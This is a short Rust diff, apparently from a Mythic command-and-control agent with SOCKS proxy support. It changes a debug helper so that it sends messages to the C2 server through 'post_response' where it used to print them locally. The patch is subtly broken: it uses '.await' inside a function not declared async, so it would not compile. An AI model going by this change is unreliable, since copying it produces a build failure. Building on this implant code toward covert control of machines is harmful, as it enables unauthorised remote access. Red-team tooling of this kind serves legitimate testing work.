@@ -51,8 +51,10 @@ pub fn socks_in_send(v: Value) -> Result<(), tokio_mpsc::error::SendError<Value>
 /* -------------------------- Debug helpers -------------------------- */
 
 fn debug_to_mythic(task_id: &str, title: impl Into<String>, detail: impl Into<String>) {
-    println!("{}: {}: {}", task_id, title.into(), detail.into());
-    // TODO: integrate with mythic response pipeline
+    let _ = post_response(
+        task_id,
+        json!({"user_output": format!("{}: {}", title.into(), detail.into())})
+    ).await;
 }
 
 fn hex_preview(data: &[u8], max: usize) -> String {
